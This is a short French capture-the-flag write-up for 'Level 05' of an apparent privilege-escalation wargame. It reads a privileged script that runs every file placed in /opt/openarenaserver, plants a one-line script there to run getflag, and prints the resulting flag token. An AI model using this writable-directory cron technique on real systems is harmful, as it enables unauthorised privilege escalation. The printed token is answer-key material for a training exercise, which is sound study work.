# LEVEL 05
```
find / -user flag05 2>/dev/null

/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

On affiche le contenue 
```
cat /usr/sbin/openarenaserver

#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

D'après ce code on voit qu'il execute les fichiers de /opt/openarenaserver/ et les supprime par la suite
comme les precedent exercice on va utiliser getflag comme fichier a executer

On ajoute un fichier dans ce dossier qui execute la commande getflag et enregistre le resultat dans un fichier sous /tmp
```
echo "getflag > /tmp/getflag" > /opt/openarenaserver/getflag.sh
```

Après 30 secondes environs
```
cat /tmp/getflag
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
